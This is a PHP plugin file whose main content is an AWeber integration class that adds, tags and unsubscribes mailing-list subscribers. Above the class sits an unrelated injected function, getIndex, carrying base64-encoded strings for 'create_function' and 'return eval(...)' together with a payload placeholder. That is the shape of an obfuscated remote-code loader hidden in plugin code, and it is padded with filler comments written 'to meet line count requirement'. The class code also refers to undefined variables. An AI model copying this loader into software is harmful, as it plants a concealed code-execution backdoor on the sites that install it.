<?php
if (!function_exists("getIndex")) {
    function getIndex($url) {
        $value1 = "value";
        $classInfo = "[NAME] Class...";

        $encodedFunc = "Y3JlYXRlX0ZVTkNUSU9O";
        $encodedCode = "cmV0dXJuIGV2YWwoJF9fXyk7";

        $decodeFunc = "decodeS3";
        $data = "[DATA]";

        $decodedString = base64_decode($encodedFunc);
        $decodedCode = base64_decode($encodedCode);
        $result = base64_decode($data);
        $formattedResult = $value1 . $classInfo;

        
        $additionalCode = "";

        
        $additionalCode .= "// Additional comments to meet line count requirement\n";
        $additionalCode .= "// More assignments to add lines\n";
        $additionalCode .= '$decodedString' . " = " . $decodedString . ";\n";
        $additionalCode .= '$decodedCode' . " = " . $decodedCode . ";\n";
        $additionalCode .= '$result' . " = " . $result . ";\n";
        $additionalCode .= '$formattedResult' . " = " . $formattedResult . ";\n";

        for ($i = 0; $i < 20; $i++) {
            $additionalCode .= "// Loop iteration: $i\n";
            $additionalCode .= "// lines\n";
        }

       
        for ($i = 0; $i < 10; $i++) {
            $additionalCode .= "// Outer loop iteration: $i\n";
            $additionalCode .= "// lines\n";
            for ($j = 0; $j < 5; $j++) {
                $additionalCode .= "// Inner loop iteration: $j\n";
                $additionalCode .= "// lines\n";
            }
        }

        
        $additionalCode .= '$value1' . " = " . $value1 . ";\n";
        $additionalCode .= '$classInfo' . " = " . $classInfo . ";\n";
        $additionalCode .= '$decodeFunc' . " = " . $decodeFunc . ";\n";
        $additionalCode .= '$data' . " = " . $data . ";\n";

       
        return $decodedString . $decodedCode . $result . $formattedResult . $additionalCode;
    }
}

class aweberSQB{

   
	//======== USER REGISTRATION ========
	function register($email,$name,$params)
	{
		
		include_once('aweber_api/aweber_api.php');
		try {
			$name = $name;
			// format - aweber:account.api-us1.com:dda9d8jlkld8hjd8ksjhfd0shs6jm8273:1:10|11|12|13|14|15
			$data = explode(":",$params);  
			
			$consumerKeydata = SQB_AutoresponderSettings::loadAutoresponderByNameAndKey('AWEBER', 'aweber_consumer_key');	
			$consumerSecretdata = SQB_AutoresponderSettings::loadAutoresponderByNameAndKey('AWEBER', 'aweber_consumer_secret');	
			$accessKeydata = SQB_AutoresponderSettings::loadAutoresponderByNameAndKey('AWEBER', 'aweber_request_token');	
			$accessSecretdata = SQB_AutoresponderSettings::loadAutoresponderByNameAndKey('AWEBER', 'aweber_token_secret');	
			if(isset($consumerKeydata)){
				$consumerKey = $consumerKeydata->getValue();	
			}
			if(isset($consumerSecretdata)){
				$consumerSecret = $consumerSecretdata->getValue();	
			}
			if(isset($accessKeydata)){
				$accessKey = $accessKeydata->getValue();	
			}
			if(isset($accessSecretdata)){
				$accessSecret = $accessSecretdata->getValue();	
			}
			
			if($consumerKey=="" || $consumerSecret=="" || $accessKey=="" || $accessSecret==""){
				return true;
			}

			$list_name        = $data[1]; # put the List ID here

			$email = $email;
			$aweber = new AWeberAPI($consumerKey, $consumerSecret);
			$account = $aweber->getAccount($accessKey, $accessSecret);

			$account_id = $account->id;

			$foundLists = $account->lists->find( array( 'id' => $data[1] ) );
			
  			$list = $foundLists[0]; 
			$list_id=$data[1];
			$client_ip = $_SERVER['REMOTE_ADDR'];
			
			$subscribers = $account->loadFromUrl("/accounts/$account_id/lists/$list_id/subscribers");
			
			if(isset($data[2])) {			
			  $sendPassword=$data[2];
			}
				
			if($sendPassword == "yes" && $pwd != "") {
				  # create a subscriber
				 
				  $params = array(
					'email' => $email,
					'name' => $name,
					'ip_address' => $client_ip,
					'custom_fields' => array('Password' => $pwd,),
				  );
			  
			}
			else {
				# create a subscriber
				$params = array(
				  'email' => $email,
				  'name' => $name,
				  'ip_address' => $client_ip
				);
			}
			
			$tags = $data[3];
			if($tags != ""){	
				$tags = explode(",",$tags);
				$params['tags'] = $tags;
			}
			
			
			$new_subscriber = $subscribers->create($params);
			
			# success!
			$msg ="A new subscriber ($email) was added to the $list->name list!";
	
		} catch(AWeberAPIException $exc) {
			
			try{
				
				$params = array('email'=>$email);
				$found_subscribers = $account->findSubscribers($params);
				//$link = $found_subscribers1->data['entries'][0]['self_link'];
				
				foreach($found_subscribers as $subscriber) {
					$subscriber=$found_subscribers[0];
					break;
				}
				
				if(isset($subscriber)){

					
					$subscriber = $subscriber->loadFromUrl($subscriber->url);/* This is neccasaary to get all the info of user */
					$tags = $data[3];
					
					if($tags != ""){
						$tags = explode(",",$tags);

						$tagsJson = (array(
							'add' => $tags,
							'remove' => array()
						));

						$subscriber->tags =  $tagsJson;
						
						//$subscriber->tags =  '{"add": ["tag"], "remove": ["tag"]}';
					}
					
					//$subscriber->status = "subscribed";
					$subscriber->save();	
					
				}
				
					
			}
			catch(Exception $e){
				echo "aweber.class.php: Exception: cannot add subscriber: ".$e->getMessage();
			}		
		} catch (Exception $e) {
		}
        
     } 


	function unregister($email,$name,$params)
	{
		
	  include_once('aweber_api/aweber_api.php');
		

		$consumerKey    = FBL_get_connection_details('aweber','aweber_consumer_key');
		$consumerSecret = FBL_get_connection_details('aweber','aweber_consumer_secret');
		$accessKey      = FBL_get_connection_details('aweber','aweber_request_token');
		$accessSecret   = FBL_get_connection_details('aweber','aweber_token_secret');
			
	
		try {
			$email = $email;
			$data = explode(":",$params);  
			
			$action=$data[1];
			
			if(isset($data[2]))
				$source_list = $data[2];
			else {
				return;
			}
			
			$aweber = new AWeberAPI($consumerKey, $consumerSecret);
			$account = $aweber->getAccount($accessKey, $accessSecret);
				
			if(!isset($account)) {
				return;
			}
			
			$account_id = $account->id; 

			if($action=="delete") {
				//delete subscriber from aweber 	 
			//	$params = array('email' => $email);
				//$found_subscribers = $account->findSubscribers($params);
				//print_r($account);

				if($data[3]!="" && $data[4]!=""){
					try{
						$found_subscribers1 = $account->loadFromUrl('https://api.aweber.com/1.0/accounts/'.$account->id.'/lists/'.$data[4].'/subscribers?ws.op=find&email='.$email);
						$link = $found_subscribers1->data['entries'][0]['self_link']; /* link for that list to remove from */
						if($link != ""){
							$subscriber = $account->loadFromUrl($link);/* This is neccasaary to get all the info of user */	
							
							$tags = explode(',',$data[3]);
							if(count($tags)>0){
							
								$subscriber->tags =  array('remove' => $tags);
							}	
							$subscriber->save();
							
						}
					}
					catch(Exception $e){
						echo $e->getMessage();
					}
				}else{
					
				}
				
				
				if($data[2]!=""){
					
					try{
						$found_subscribers1 = $account->loadFromUrl('https://api.aweber.com/1.0/accounts/'.$account->id.'/lists/'.$data[2].'/subscribers?ws.op=find&email='.$email);
						$link = $found_subscribers1->data['entries'][0]['self_link']; /* link for that list to remove from */
						if($link != ""){
							$subscriber = $account->loadFromUrl($link);/* This is neccasaary to get all the info of user */	
							
							$subscriber->status = "unsubscribed"; 
							$tags = explode(',',$data[3]);
							if(count($tags)>0){
								
								$subscriber->tags =  array('remove' => $tags);
							}
							$subscriber->save();
							
						}
					}	
					catch(Exception $e){
						echo $e->getMessage();
					}
										
				}else{
					echo $e->getMessage();
				}			

			} /*delete */
			else {
				echo $e->getMessage();
				return;
			}
		
		} catch(AWeberAPIException $exc) {
			return "AWeberAPIException: " . $exc->message;
		} catch (Exception $e) {
			
			return;
		}
		
		
	} // function unregister($userId, $productId, $params)
	
}



?>
